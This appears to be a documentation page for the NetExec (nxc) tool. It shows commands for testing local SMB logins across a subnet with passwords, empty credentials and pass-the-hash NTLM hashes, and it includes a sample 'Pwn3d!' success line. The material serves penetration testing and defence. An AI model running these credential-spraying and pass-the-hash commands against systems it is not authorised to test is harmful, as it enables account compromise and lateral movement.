# Checking credentials (Local)

### User/Password/Hashes

Adding `--local-auth` to any of the authentication commands with attempt to logon locally.

```bash
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-auth
nxc smb 192.168.1.0/24 -u '' -p '' --local-auth
nxc smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --local-auth
nxc smb 192.168.1.0/24 -u UserNAme -H 'NTHASH' --local-auth
nxc smb 192.168.1.0/24 -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth
nxc smb 192.168.1.0/24 -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth
```

Results will display the hostname next to the user:password

```bash
	SMB         192.168.1.101    445    HOSTNAME          [+] HOSTNAME\Username:Password (Pwn3d!)  
```
